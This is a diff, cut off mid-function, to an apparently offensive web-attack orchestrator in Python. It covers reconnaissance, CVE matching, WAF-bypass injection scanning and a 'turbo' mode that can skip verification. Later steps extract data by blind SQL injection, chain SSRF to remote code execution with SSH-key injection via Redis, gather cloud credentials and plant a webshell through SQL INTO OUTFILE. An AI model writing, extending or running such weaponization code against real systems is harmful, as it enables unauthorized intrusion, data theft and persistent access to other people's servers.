@@ -1,4 +1,7 @@
-import json, time, threading, concurrent.futures
+import concurrent.futures
+import json
+import threading
+import time
 from typing import Dict, List, Optional
 
 from tools.log_utils import get_logger
@@ -6,35 +9,60 @@ from tools.log_utils import get_logger
 logger = get_logger("orchestrator")
 
 from tools import (
-    crawler, param_miner,
-    sql_injection, xss_detector, ssti_detector, cmdi_detector,
-    ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass,
-    sqli_weaponizer, jwt_exploiter, reverse_shell,
-    race_condition, jwt_detector, graphql_scanner, cors_scanner,
-    deserialization_detector, proto_pollution,
-    waf_bypass, biz_logic_scanner,
+    auth_bypass,
+    biz_logic_scanner,
+    cmdi_detector,
+    cors_scanner,
+    crawler,
+    deserialization_detector,
+    graphql_scanner,
+    jwt_detector,
+    jwt_exploiter,
+    lfi_scanner,
+    nosqli_detector,
+    param_miner,
+    proto_pollution,
+    race_condition,
+    sql_injection,
+    sqli_weaponizer,
+    ssrf_detector,
+    ssti_detector,
+    waf_bypass,
+    xss_detector,
 )
-from tools.oob_server import OOBServer
-from tools.response_profiler import ResponseProfiler
-from tools.verification_oracle import VerificationOracle
-from tools.dual_session import DualSessionManager
-from tools.playwright_engine import PlaywrightEngine
-from tools.spa_crawler import crawl_spa
-from tools.recon import (
-    enum_subdomains, scan_ports, fingerprint_tech,
-    check_git_leak, fuzz_directories,
-)
-from tools.attack_surface import build_attack_plan, pivot_on_intermediate_result
-from tools.reasoning_engine import ReasoningEngine
 from tools.adaptive_fuzzer import AdaptiveFuzzer
+from tools.adaptive_payload import suggest_additional_tests
+from tools.attack_graph import build_attack_graph
+from tools.attack_surface import build_attack_plan, pivot_on_intermediate_result
+from tools.binary_search import binary_search_sqli_blind, sqli_union_probe
+from tools.context_memory import get_memory
+from tools.cross_validator import run_cross_validation
+from tools.dual_session import DualSessionManager
+from tools.enhanced_verify import EnhancedVerifier
+from tools.graphql_abuser import check as graphql_abuse_check
+from tools.jwt_attacker import check as jwt_attack_check
+from tools.oob_server import OOBServer
+from tools.playwright_engine import PlaywrightEngine
+from tools.reasoning_engine import ReasoningEngine
+from tools.recon import (
+    check_git_leak,
+    fingerprint_tech,
+    fuzz_directories,
+    scan_ports,
+)
+from tools.response_profiler import ResponseProfiler
+from tools.robust_verifier import verify_finding as robust_verify
+from tools.ssrf_chain import chain_ssrf as ssrf_chain_attack
+from tools.type_confusion import TypeConfusionDetector
+from tools.version_fingerprint import fingerprint_target
 
 # New enhanced modules
 from tools.second_order_verifier import SecondOrderVerifier
-from tools.attack_graph import AttackGraph, build_attack_graph
+from tools.semantic_analyzer import analyze_single_response, compare_responses
+from tools.spa_crawler import crawl_spa
+from tools.verification_oracle import VerificationOracle
+from tools.vuln_context import ContextMemory as VulnContextMemory
 from tools.xxe_detector import check as xxe_check
-from tools.context_memory import get_memory
-from tools.graphql_abuser import check as graphql_abuse_check
-from tools.jwt_attacker import check as jwt_attack_check
 
 SKIP_PARAMS = {
     "submit", "button", "reset", "image", "file", "action",
@@ -73,21 +101,31 @@ DETECTOR_RISK_ORDER = {
 }
 
 
+# High-value mode: skip low-impact vuln types
+HIGH_VALUE_DETECTORS = {"sql_injection", "cmdi", "deser", "xxe", "ssrf", "lfi", "ssti"}
+LOW_VALUE_DETECTORS = {"cors", "xss", "prototype_pollution", "race", "waf_heavy"}
+
+
 class Orchestrator:
     def __init__(self, target: str,
                  sess: Optional['requests.Session'] = None, timeout: float = 10.0,
-                 threads: int = 10, max_pages: int = 30, max_depth: int = 2,
+                 threads: int = 20, max_pages: int = 50, max_depth: int = 3,
                  high_priv_sess: Optional['requests.Session'] = None,
-                 fast_recon: bool = True, time_budget: Optional[float] = None):
+                 fast_recon: bool = True, time_budget: Optional[float] = None,
+                 high_value: bool = False, turbo: bool = False,
+                 skip_verify: bool = False):
         self.target = target.rstrip("/")
         self.timeout = timeout
         self.sess = sess
         self.high_priv_sess = high_priv_sess
-        self.threads = threads
-        self.max_pages = max_pages
-        self.max_depth = max_depth
+        self.threads = threads if not turbo else min(threads * 3, 60)
+        self.max_pages = max_pages if not turbo else min(max_pages * 2, 100)
+        self.max_depth = max_depth if not turbo else min(max_depth + 1, 5)
         self.fast_recon = fast_recon
-        self.time_budget = time_budget or 600.0
+        self.turbo = turbo
+        self.time_budget = time_budget or (180.0 if turbo else (300.0 if high_value else 600.0))
+        self.high_value = high_value
+        self.skip_verify = skip_verify
         self._start_time = time.time()
         self.state = {
             "phases": {},
@@ -108,10 +146,88 @@ class Orchestrator:
         self.attack_graph = None
         self._backtrack_findings = []
         self._lock = threading.Lock()
+        self._fast_mode = False
+        self._detectors_disabled = set()
 
         # New enhanced systems
         self.context_memory = get_memory()
         self.verifier = SecondOrderVerifier(sess, timeout)
+        self.vuln_ctx = VulnContextMemory()
+        from tools.evasion_engine import EvasionEngine
+        self.evasion = EvasionEngine()
+        self._storage = None
+        self._storage_name = "default"
+
+    def init_storage(self, resume: bool = False, name: str = "default"):
+        from tools.storage import SessionStore
+        self._storage_name = name
+        self._storage = SessionStore(name)
+        self.context_memory.set_storage(self._storage)
+        self.vuln_ctx.set_storage(self._storage)
+        if resume:
+            self._resume_state()
+
+    def _resume_state(self):
+        ctx = self._storage.load_all_context()
+        if ctx:
+            self.context_memory.restore(ctx)
+            logger.info("Resumed %d context entries from session %s", len(ctx), self._storage_name)
+        vctx = self._storage.load_vuln_context()
+        if vctx:
+            self.vuln_ctx.restore(vctx)
+            logger.info("Resumed vuln_context (%d fields) from session %s", len(vctx), self._storage_name)
+        phases = self._storage.load_all_phases()
+        if phases:
+            for ph, st in phases.items():
+                if isinstance(st, dict):
+                    self.state["phases"][ph] = st
+                    logger.info("Resumed phase '%s' state", ph)
+        findings = self._storage.load_findings()
+        if findings:
+            for f in findings:
+                key = "%s|%s|%s" % (f.get("vuln_type", ""), f.get("url", ""), f.get("param", ""))
+                self.all_findings[key] = {
+                    "type": f.get("vuln_type", ""),
+                    "url": f.get("url", ""),
+                    "param": f.get("param", ""),
+                    "result": f.get("detail", {}),
+                    "vulnerable": True,
+                    "confidence_score": f.get("confidence", 0.5),
+                }
+            logger.info("Resumed %d findings from session %s", len(findings), self._storage_name)
+        report = self._storage.load_report()
+        if report:
+            self.state["report"] = report
+
+    def _save_phase(self, phase: str):
+        if not self._storage:
+            return
+        try:
+            data = self.state["phases"].get(phase)
+            if data:
+                self._storage.save_phase(phase, {"_data": data, "_saved_at": time.time()})
+        except Exception as e:
+            logger.debug("save phase %s: %s", phase, e)
+
+    def _save_findings(self, findings: Dict):
+        if not self._storage:
+            return
+        try:
+            for key, f in findings.items():
+                if key.startswith("__"):
+                    continue
+                self._storage.save_finding(
+                    finding_id=key,
+                    vuln_type=f.get("type", "unknown"),
+                    url=f.get("url", ""),
+                    param=f.get("param", ""),
+                    payload="",
+                    severity="high" if f.get("confidence_score", 0) > 0.8 else "medium",
+                    confidence=f.get("confidence_score", 0.5),
+                    detail=f.get("result", {}),
+                )
+        except Exception as e:
+            logger.debug("save findings: %s", e)
 
     def phase_recon(self) -> Dict:
         print("[Recon] Phase 1/7: Reconnaissance ...")
@@ -126,6 +242,20 @@ class Orchestrator:
                 print("      - %s" % t["name"])
         else:
             print("    -> No specific tech detected")
+
+        print("  [Recon] Version fingerprint & CVE matching ...")
+        try:
+            version_info = fingerprint_target(self.target, self.sess, self.timeout)
+            recon["version_info"] = version_info
+            critical_versions = version_info.get("critical_versions", [])
+            if critical_versions:
+                print("    -> %d critical versions with CVE matches:" % len(critical_versions))
+                for cv in critical_versions:
+                    print("      - %s %s: %s" % (cv["product"], cv["version"], ", ".join(cv["cves"][:3])))
+            else:
+                print("    -> %d versions detected, no critical CVE matches" % version_info.get("total_versions", 0))
+        except Exception as e:
+            logger.debug("version fingerprint: %s", e)
 
         print("  [Recon] Quick port scan (top 100) ...")
         recon["open_ports"] = scan_ports(self.target, fast=self.fast_recon)
@@ -159,7 +289,31 @@ class Orchestrator:
         else:
             print("    -> No interesting paths found")
 
+        print("  [Recon] Debug/actuator endpoint probe ...")
+        debug_paths = [
+            "/actuator", "/actuator/health", "/actuator/env",
+            "/.env", "/debug", "/api/debug", "/console",
+            "/h2-console", "/api/health", "/api/env",
+        ]
+        debug_found = []
+        for dp in debug_paths:
+            try:
+                r = self.sess.get(self.target.rstrip("/") + dp, timeout=self.timeout)
+                if r.status_code in (200, 401, 403) and len(r.text) > 5:
+                    debug_found.append({"path": dp, "status": r.status_code, "size": len(r.text)})
+            except Exception:
+                pass
+        if debug_found:
+            print("    -> %d debug/actuator endpoints found" % len(debug_found))
+            for d in debug_found:
+                print("      - %s [%d] (%d bytes)" % (d["path"], d["status"], d["size"]))
+            self.vuln_ctx.update(has_debug_mode=True)
+            self.vuln_ctx.update(debug_endpoints=[d["path"] for d in debug_found])
+        else:
+            print("    -> No debug endpoints detected")
+
         self.state["phases"]["recon"] = recon
+        self._save_phase("recon")
         return recon
 
     def phase_attack_plan(self) -> Dict:
@@ -196,6 +350,7 @@ class Orchestrator:
 
         self.attack_plan = plan
         self.state["phases"]["attack_plan"] = plan
+        self._save_phase("attack_plan")
         return plan
 
     def phase_reason(self) -> List[Dict]:
@@ -261,7 +416,8 @@ class Orchestrator:
         for path in graph_summary.get("best_paths", [])[:3]:
             print("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
 
-        self.state["phases"]["reason"]["attack_graph"] = graph_summary
+            self.state["phases"]["reason"]["attack_graph"] = graph_summary
+        self._save_phase("reason")
         return hypo_dicts
 
     def phase_crawl(self) -> Dict:
@@ -269,6 +425,7 @@ class Orchestrator:
                                 max_pages=self.max_pages, sess=self.sess,
                                 timeout=self.timeout)
         self.state["phases"]["crawl"] = result
+        self._save_phase("crawl")
         return result
 
     def phase_mine(self, crawl_result: Dict = None) -> Dict:
@@ -280,6 +437,7 @@ class Orchestrator:
         result = param_miner.mine(self.target, endpoints, self.sess,
                                     self.timeout, self.threads)
         self.state["phases"]["param_mine"] = result
+        self._save_phase("param_mine")
         return result
 
     def _select_detectors(self) -> List[str]:
@@ -289,7 +447,7 @@ class Orchestrator:
                 for d in list(ALL_DETECTORS.keys()):
                     if d not in suggested:
                         suggested.append(d)
-                return suggested
+                return self._filter_high_value(suggested)
 
         plan = self.attack_plan
         recommended = []
@@ -305,8 +463,18 @@ class Orchestrator:
         if not recommended:
             recommended = list(ALL_DETECTORS.keys())
 
+        recommended = self._filter_high_value(recommended)
         recommended.sort(key=lambda d: DETECTOR_RISK_ORDER.get(d, 9))
         return recommended
+
+    def _filter_high_value(self, detectors: list) -> list:
+        if not self.high_value:
+            return detectors
+        filtered = [d for d in detectors if d in HIGH_VALUE_DETECTORS]
+        skipped = set(detectors) - set(filtered)
+        if skipped:
+            print("  [high-value] skipped low-impact detectors: %s" % ", ".join(sorted(skipped)))
+        return filtered
 
     def _build_test_points(self) -> List[Dict]:
         points = []
@@ -408,7 +576,8 @@ class Orchestrator:
                 enriched.append(p)
             points = enriched
 
-        return points[:250]
+        limit = 500 if self.turbo else 300
+        return points[:limit]
 
     def _budget_remaining(self) -> float:
         return self.time_budget - (time.time() - self._start_time)
@@ -418,12 +587,12 @@ class Orchestrator:
 
     def _filter_by_budget(self, points: List[Dict]) -> List[Dict]:
         remaining = self._budget_remaining()
-        if remaining > self.time_budget * 0.5:
+        if remaining > self.time_budget * 0.6:
             return points
-        if remaining < 30:
-            return points[:50]
+        if remaining < 15:
+            return points[:30]
         ratio = remaining / self.time_budget
-        cutoff = max(int(len(points) * ratio), 10)
+        cutoff = max(int(len(points) * ratio), 20)
         return points[:cutoff]
 
     def _maybe_backtrack_chain(self, finding: Dict) -> Optional[Dict]:
@@ -524,6 +693,21 @@ class Orchestrator:
                           c.split(":")[0] if ":" in c else c.split("@")[0])
                     self.state.setdefault("admin_creds", []).append(c)
 
+    def _run_detector(self, vtype: str, url: str, param: str,
+                      waf_name: Optional[str], oob: dict,
+                      effective_timeout: float) -> Optional[Dict]:
+        fn = ALL_DETECTORS.get(vtype)
+        if fn is None:
+            return None
+        try:
+            r = fn(url, param, self.sess, effective_timeout, waf_name, oob)
+            if isinstance(r, dict):
+                r["_vtype"] = vtype
+                return r
+        except Exception as e:
+            logger.debug("detect %s on %s?%s: %s", vtype, url, param, e)
+        return None
+
     def _test_single_point(self, point: Dict, active_detectors: List[str],
                            waf_name: Optional[str] = None,
                            oob_url: Optional[str] = None,
@@ -535,66 +719,168 @@ class Orchestrator:
         param = point["param"]
         oob = {"oob_url": oob_url, "oob_domain": oob_domain}
         results = []
+        found_critical = False
 
+        effective_timeout = max(self.timeout * 0.7, 3.0) if self.turbo else self.timeout
+
+        eligible = []
         for vtype in active_detectors:
+            if vtype in self._detectors_disabled:
+                continue
+            if found_critical and vtype in LOW_VALUE_DETECTORS:
+                continue
+            time_sensitive = {"sqli", "cmdi", "nosqli", "ssti"}
+            timeout_needed = 8 if self.turbo else 10
+            if vtype in time_sensitive and not self._budget_ok(timeout_needed):
+                continue
+            eligible.append(vtype)
+
+        if not eligible:
+            return []
+
+        if self.turbo and len(eligible) > 1:
+            det_workers = min(len(eligible), 4)
+            raw_results = []
+            with concurrent.futures.ThreadPoolExecutor(max_workers=det_workers) as dex:
+                futures = {
+                    dex.submit(self._run_detector, vt, url, param, waf_name, oob, effective_timeout): vt
+                    for vt in eligible
+                }
+                for future in concurrent.futures.as_completed(futures):
+                    if not self._budget_ok(2):
+                        for f in futures:
+                            f.cancel()
+                        break
+                    try:
+                        r = future.result(timeout=effective_timeout + 2)
+                        if r:
+                            raw_results.append(r)
+                    except Exception:
+                        pass
+        else:
+            raw_results = []
+            for vtype in eligible:
+                if not self._budget_ok(2):
+                    break
+                r = self._run_detector(vtype, url, param, waf_name, oob, effective_timeout)
+                if r:
+                    raw_results.append(r)
+
+        for r in raw_results:
+            vtype = r.pop("_vtype", "")
             if not self._budget_ok(2):
                 break
-            time_sensitive = {"sqli", "cmdi", "nosqli", "ssti"}
-            if vtype in time_sensitive and not self._budget_ok(10):
-                continue
 
-            fn = ALL_DETECTORS.get(vtype)
-            if fn is None:
-                continue
-            try:
-                r = fn(url, param, self.sess, self.timeout, waf_name, oob)
-                if isinstance(r, dict):
-                    native_confidence = r.get("confidence_score", 0.0)
-                    native_votes = r.get("confidence_votes", [])
-                    native_evidence = r.get("evidence", [])
+            native_confidence = r.get("confidence_score", 0.0)
+            native_votes = r.get("confidence_votes", [])
+            native_evidence = r.get("evidence", [])
 
-                    vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
-                    if vuln and self._budget_ok(5):
-                        r = self._cross_verify(vtype, url, param, waf_name, oob, r)
-                        vuln = r.get("confirmed", vuln)
-                    if vuln:
-                        verified = self.oracle.verify(vtype, r, url, param, self.sess, self.timeout)
-                        if verified.get("verified") is not False:
-                            oracle_confidence = verified.get("confidence_score", 0.0)
+            vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
+            if vuln and not self.skip_verify and self._budget_ok(5):
+                r = self._cross_verify(vtype, url, param, waf_name, oob, r)
+                vuln = r.get("confirmed", vuln)
+            if vuln:
+                if vtype in ("sql_injection", "cmdi", "ssrf", "deser"):
+                    found_critical = True
+                    if self._fast_mode:
+                        self._detectors_disabled.update(LOW_VALUE_DETECTORS)
 
-                            finding = {
-                                "type": vtype,
-                                "url": url,
-                                "param": param,
-                                "result": verified,
-                                "vulnerable": True,
-                                "detector_confidence": round(native_confidence, 2),
-                                "confidence_score": round(max(native_confidence, oracle_confidence), 2),
-                                "confidence_votes": verified.get("confidence_votes", []) or native_votes,
-                                "evidence": verified.get("evidence", native_evidence),
-                                "timestamp": time.time(),
-                                "response_text": verified.get("response_text", r.get("response_text", "")),
-                            }
+                if self.skip_verify:
+                    verified = r
+                    verified["verified"] = True
+                    oracle_confidence = native_confidence
+                else:
+                    verified = self.oracle.verify(vtype, r, url, param, self.sess, self.timeout)
+                    oracle_confidence = verified.get("confidence_score", 0.0)
 
-                            from tools.false_positive_filter import FalsePositiveFilter
-                            fpf = FalsePositiveFilter(self.profiler)
-                            finding = fpf.filter_single(finding)
+                if verified.get("verified") is not False:
+                    finding = {
+                        "type": vtype,
+                        "url": url,
+                        "param": param,
+                        "result": verified,
+                        "vulnerable": True,
+                        "detector_confidence": round(native_confidence, 2),
+                        "confidence_score": round(max(native_confidence, oracle_confidence), 2),
+                        "confidence_votes": verified.get("confidence_votes", []) or native_votes,
+                        "evidence": verified.get("evidence", native_evidence),
+                        "timestamp": time.time(),
+                        "response_text": verified.get("response_text", r.get("response_text", "")),
+                    }
 
-                            if not finding.get("filtered", False):
-                                results.append(finding)
+                    if not self.skip_verify:
+                        from tools.false_positive_filter import FalsePositiveFilter
+                        fpf = FalsePositiveFilter(self.profiler)
+                        finding = fpf.filter_single(finding)
 
-                                with self._lock:
-                                    self._backtrack_findings.append(finding)
+                    if not finding.get("filtered", False):
+                        if not self.skip_verify:
+                            rv = robust_verify(vtype, url, param, self.sess, self.timeout, self.oob_server)
+                            if rv.get("vulnerable"):
+                                finding["robust_verified"] = True
+                                finding["confidence_score"] = max(finding.get("confidence_score", 0), rv["confidence"])
+                                finding["robust_check"] = rv
+                                if rv.get("dbms"):
+                                    finding["dbms"] = rv["dbms"]
 
-                                chain_result = self._maybe_backtrack_chain(finding)
-                                if chain_result:
-                                    finding["_chain_result"] = chain_result
-                                    self._backtrack_loop_closure(chain_result, finding)
-                            else:
-                                with self._lock:
-                                    self.state.setdefault("filtered_findings", []).append(finding)
-            except Exception as e:
-                logger.debug("detect %s on %s?%s: %s", vtype, url, param, e)
+                        if vtype in ("sqli", "ssrf", "lfi", "cmdi", "deser"):
+                            self.vuln_ctx.update(**{vtype: True, vtype + "_verified": True})
+                        if vtype == "ssrf":
+                            cloud = finding.get("result", {}).get("cloud")
+                            if cloud:
+                                self.vuln_ctx.update(cloud_provider=cloud)
+                        if vtype == "sqli":
+                            dbms = finding.get("result", {}).get("dbms")
+                            if not self.skip_verify:
+                                dbms = dbms or rv.get("dbms")
+                            if dbms:
+                                self.vuln_ctx.update(dbms=dbms)
+                        if vtype == "cmdi":
+                            os_type = finding.get("result", {}).get("os_type")
+                            if os_type:
+                                self.vuln_ctx.update(os_type=os_type)
+
+                        results.append(finding)
+
+                        with self._lock:
+                            self._backtrack_findings.append(finding)
+
+                        chain_result = self._maybe_backtrack_chain(finding)
+                        if chain_result:
+                            finding["_chain_result"] = chain_result
+                            self._backtrack_loop_closure(chain_result, finding)
+
+                        if not self.skip_verify:
+                            cross = run_cross_validation(vtype, url, param, self.sess, self.timeout)
+                            if cross.get("vulnerable"):
+                                finding["cross_validated"] = True
+                                finding["cross_checks"] = cross.get("cross_checks", {})
+                                finding["confidence_score"] = max(finding.get("confidence_score", 0), cross.get("confidence", 0))
+                                if cross.get("rce_available"):
+                                    finding["rce_available"] = True
+
+                        if vtype == "sqli" and finding.get("vulnerable"):
+                            try:
+                                union_probe = sqli_union_probe(url, param, self.sess, self.timeout)
+                                if union_probe.get("vulnerable"):
+                                    finding["sql_columns"] = union_probe.get("columns")
+                                    finding["sql_usable_columns"] = union_probe.get("usable_columns")
+                                blind_data = binary_search_sqli_blind(url, param, self.sess, self.timeout)
+                                if blind_data.get("extracted"):
+                                    finding["blind_extracted"] = blind_data["extracted"]
+                            except Exception:
+                                pass
+
+                        if vtype in ("sqli", "ssrf", "lfi", "cmdi", "ssti"):
+                            try:
+                                extra_tests = suggest_additional_tests(vtype, self.vuln_ctx)
+                                if extra_tests:
+                                    finding["suggested_next_steps"] = extra_tests
+                            except Exception:
+                                pass
+                    else:
+                        with self._lock:
+                            self.state.setdefault("filtered_findings", []).append(finding)
         return results
 
     def _update_context_memory(self, findings: Dict) -> None:
@@ -674,19 +960,55 @@ class Orchestrator:
         elif 22 in open_ports:
             self.context_memory.set("os_type", "linux", "port_scan", 0.60)
 
+        vc = self.vuln_ctx.get()
+        if vc.dbms:
+            self.context_memory.set("dbms", vc.dbms, "vuln_context", 0.85)
+        if vc.cloud_provider:
+            self.context_memory.set("cloud_provider", vc.cloud_provider, "vuln_context", 0.80)
+        if vc.os_type:
+            self.context_memory.set("os_type", vc.os_type, "vuln_context", 0.80)
+        if vc.ssti_engine:
+            self.context_memory.set("template_engine", vc.ssti_engine, "vuln_context", 0.85)
+        if vc.has_admin_panel:
+            self.context_memory.set("admin_panel", True, "vuln_context", 0.75)
+        if vc.has_graphql:
+            self.context_memory.set("has_graphql", True, "vuln_context", 0.80)
+        if vc.ssrf_cloud_creds:
+            self.context_memory.set("cloud_creds", vc.ssrf_cloud_creds, "vuln_context", 0.90)
+        if vc.lfi_readable_paths:
+            self.context_memory.set("lfi_readable_paths", vc.lfi_readable_paths, "vuln_context", 0.85)
+        if vc.debug_endpoints:
+            self.context_memory.set("debug_endpoints", vc.debug_endpoints, "vuln_context", 0.85)
+        if vc.discovered_versions:
+            for k, val in vc.discovered_versions.items():
+                self.context_memory.set(k, val, "vuln_context", 0.80)
+
+        best_paths = vc.best_exploit_path()
+        if best_paths:
+            self.context_memory.set("best_exploit_paths", best_paths, "vuln_context", 0.85)
+
     def phase_auth_bypass(self) -> Dict:
         result = auth_bypass.check(self.target, self.sess, self.timeout)
         self.state["phases"]["auth_bypass"] = result
+        self._save_phase("auth_bypass")
         return result
 
     def phase_detect(self) -> Dict:
+        recon = self.state["phases"].get("recon", {})
         active = self._select_detectors()
         print("  -> Active detectors (%d): %s" % (len(active), ", ".join(active)))
 
-        waf_info = waf_bypass.fingerprint_waf(self.target, self.sess, self.timeout)
+        cached_waf = self.context_memory.get("waf")
+        if cached_waf:
+            waf_info = {"name": cached_waf}
+            print("  [WAF] %s detected (cached)" % cached_waf)
+        else:
+            waf_info = waf_bypass.fingerprint_waf(self.target, self.sess, self.timeout)
+            waf_name_val = waf_info.get("name")
+            if waf_name_val:
+                self.context_memory.set("waf", waf_name_val, "waf_bypass", 0.90)
+                print("  [WAF] %s detected - using bypass strategies" % waf_name_val)
         waf_name = waf_info.get("name")
-        if waf_name:
-            print("  [WAF] %s detected - using bypass strategies" % waf_name)
         self.state["waf"] = waf_info
 
         points = self._build_test_points()
@@ -724,10 +1046,22 @@ class Orchestrator:
                         done[0], total, len(all_findings)), end="", flush=True)
 
         if self.threads > 1 and budget_pct > 10:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
-                list(ex.map(worker, points))
+            max_workers = max(1, min(self.threads, len(points)))
+            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
+                futures = {ex.submit(worker, p): p for p in points}
+                for future in concurrent.futures.as_completed(futures):
+                    if not self._budget_ok(3):
+                        for f in futures:
+                            f.cancel()
+                        break
+                    try:
+                        future.result(timeout=2)
+                    except Exception:
+                        pass
         else:
             for p in points:
+                if not self._budget_ok(2):
+                    break
                 worker(p)
         print()
 
@@ -749,7 +1083,36 @@ class Orchestrator:
 
         self.state["phases"]["detect"] = {"test_points": total, "findings": all_findings}
         self.all_findings = all_findings
+        self._save_findings(all_findings)
+        self._save_phase("detect")
         self._run_kali_recon()
+
+        print("  [Semantic] Response structure analysis ...")
+        sem_count = 0
+        try:
+            baseline_resp = self.sess.get(self.target, timeout=self.timeout)
+            baseline_sig = analyze_single_response(baseline_resp.text, baseline_resp.status_code,
+                                                     baseline_resp.headers.get("content-type", ""))
+        except Exception:
+            baseline_sig = None
+
+        for key, finding in list(all_findings.items()):
+            if key.startswith("__") or not finding.get("vulnerable"):
+                continue
+            resp_text = finding.get("response_text", "") or finding.get("result", {}).get("response_text", "")
+            if resp_text and len(resp_text) > 50:
+                sem = analyze_single_response(resp_text, 200, "")
+                finding["semantic"] = sem
+                if baseline_sig:
+                    changes = compare_responses(baseline_sig, sem)
+                    if changes:
+                        finding["response_changes"] = changes
+                        sem_count += 1
+                errors = sem.get("errors", [])
+                if errors:
+                    finding["error_signals"] = errors
+        if sem_count:
+            print("    -> %d findings with anomalous response structure" % sem_count)
 
         # Second-order verification for high-confidence findings
         print("  [Verify] Second-order cross-validation ...")
@@ -780,8 +1143,65 @@ class Orchestrator:
         if verified_count:
             print("    -> %d findings cross-verified" % verified_count)
 
-        # Context memory updates
-        self._update_context_memory(all_findings)
+        print("  [TypeConfusion] Type confusion & TOCTOU detection ...")
+        tc_detector = TypeConfusionDetector(self.sess, self.timeout)
+        tc_count = 0
+        for point in points[:100]:
+            if not self._budget_ok(2):
+                break
+            try:
+                tc_results = tc_detector.detect(
+                    point["url"], point["param"], point.get("method", "GET")
+                )
+                for tc in tc_results:
+                    if tc.success or tc.error_leak:
+                        key = "type_confusion|%s|%s" % (point["url"], point["param"])
+                        all_findings[key] = {
+                            "type": tc.vuln_type or "type_confusion",
+                            "url": point["url"],
+                            "param": point["param"],
+                            "vulnerable": True,
+                            "confidence_score": 0.70 if tc.success else 0.50,
+                            "evidence": [tc.evidence] if tc.evidence else ["type_confusion_detected"],
+                            "tc_detail": {
+                                "original_type": tc.original_type,
+                                "confused_type": tc.confused_type,
+                                "status_changed": tc.status_changed,
+                                "error_leak": tc.error_leak,
+                                "risk_level": tc.risk_level,
+                            },
+                            "timestamp": time.time(),
+                        }
+                        tc_count += 1
+
+                toctou_results = tc_detector.detect_toctou(
+                    point["url"], point["param"], point.get("method", "GET")
+                )
+                for toctou in toctou_results:
+                    if toctou.success:
+                        key = "race_condition|%s|%s" % (point["url"], point["param"])
+                        if key not in all_findings:
+                            all_findings[key] = {
+                                "type": "race_condition",
+                                "url": point["url"],
+                                "param": point["param"],
+                                "vulnerable": True,
+                                "confidence_score": 0.75,
+                                "evidence": [toctou.evidence],
+                                "timestamp": time.time(),
+                            }
+                            tc_count += 1
+            except Exception as e:
+                logger.debug("type confusion: %s", e)
+
+        if tc_count:
+            print("    -> %d type confusion / TOCTOU findings" % tc_count)
+
+        self.state["ai_prepared"] = {
+            "waf": waf_info.get("name", ""),
+            "technologies": [t["name"] for t in recon.get("technologies", {}).get("technologies", [])],
+            "debug_endpoints": self.vuln_ctx.get().debug_endpoints,
+        }
 
         if self._backtrack_findings:
             print("  [Bayes] Updating hypotheses with %d findings ..." % len(self._backtrack_findings))
@@ -799,6 +1219,43 @@ class Orchestrator:
                         len(active), new_detectors[:3]))
 
         return all_findings
+
+    def phase_ai_hunt(self) -> Dict:
+        print("  [Intel] Gathering deep response intelligence ...")
+        result = {"anomalies_found": 0, "scan_count": 0}
+        try:
+            from tools.ai_vuln_hunter import generate_target_brief
+            recon = self.state["phases"].get("recon", {})
+            findings = self.all_findings
+            waf_data = self.state.get("waf", {})
+            ai_prep = self.state.get("ai_prepared", {})
+
+            intel = generate_target_brief(
+                sess=self.sess,
+                base_url=self.target,
+                timeout=self.timeout,
+                findings=findings,
+                recon_data={
+                    "technologies": ai_prep.get("technologies", []),
+                    "waf": ai_prep.get("waf", waf_data.get("name", "")),
+                    "debug_endpoints": ai_prep.get("debug_endpoints", []),
+                },
+                context_memory=self.context_memory,
+                vuln_ctx=self.vuln_ctx,
+            )
+            self.state["phases"]["ai_hunt"] = intel
+            print()
+            print(intel.get("brief", ""))
+            print()
+            anom = intel.get("anomalies_found", 0)
+            deep = intel.get("deep_results_count", 0)
+            print("    -> %d endpoints deep-scanned, %d behavioral anomalies" % (deep, anom))
+            result = intel
+        except Exception as e:
+            logger.debug("AI hunt: %s", e)
+            self.state["phases"]["ai_hunt"] = {"error": str(e)}
+        self._save_phase("ai_hunt")
+        return result
 
     def phase_pivot(self) -> Dict:
         findings = self.all_findings
@@ -875,6 +1332,21 @@ class Orchestrator:
                             r = chain.chain_ssrf_to_rce(v["url"], v["param"])
                             pivot_results["pivot_actions"].append(r)
                             used_chains.add("ssrf_to_rce")
+
+                            print("    -> SSRF multi-hop chain (Redis/SQL/Docker/K8s) ...")
+                            try:
+                                ssrf_chain_result = ssrf_chain_attack(
+                                    v["url"], v["param"], self.sess, self.timeout, max_hops=3
+                                )
+                                pivot_results["pivot_actions"].append(ssrf_chain_result)
+                                if ssrf_chain_result.get("rce_achieved"):
+                                    print("      [CRITICAL] SSRF chain achieved RCE via %s" % ssrf_chain_result.get("rce_method"))
+                                if ssrf_chain_result.get("services_found"):
+                                    print("      [INTERNAL] %d internal services discovered" % ssrf_chain_result["services_found"])
+                                if ssrf_chain_result.get("ssh_keys"):
+                                    print("      [SSH] SSH key injected via Redis")
+                            except Exception as e:
+                                logger.debug("ssrf chain: %s", e)
                             break
 
                 if ph.get("phase") in ("lfi_pivot",) and "lfi_to_rce" not in used_chains:
@@ -945,6 +1417,7 @@ class Orchestrator:
                             break
 
         self.state["phases"]["pivot"] = pivot_results
+        self._save_phase("pivot")
         return pivot_results
 
     def _run_kali_recon(self):
@@ -1009,12 +1482,14 @@ class Orchestrator:
         auth_data = self.state["phases"].get("auth_bypass", {})
         exploits = {}
         raw_sess = self.sess
+        webshell_urls = []
 
         def _weaponize_one(key, finding):
             vtype = finding["type"]
             url = finding["url"]
             param = finding["param"]
             result = {}
+            nonlocal webshell_urls
 
             if vtype == "sqli":
                 for mod_name, mod in [("sqli_weaponizer", sqli_weaponizer)]:
@@ -1037,11 +1512,29 @@ class Orchestrator:
                     except Exception as e:
                         logger.debug("sqlmap weaponize: %s", e)
 
+                from tools.weaponize_engine import sqli_into_outfile
+                web_root = self.vuln_ctx.get().discovered_versions.get("web_root", "/var/www/html")
+                sqli_shell = sqli_into_outfile(url, param, raw_sess, self.timeout, web_root)
+                if sqli_shell.get("success"):
+                    result["sqli_webshell"] = sqli_shell
+                    result["exploit_ready"] = True
+                    if sqli_shell.get("webshell_url"):
+                        webshell_urls.append(sqli_shell["webshell_url"])
+
             if vtype == "ssrf":
                 try:
                     from tools import ssrf_pwn as ssrf_lateral
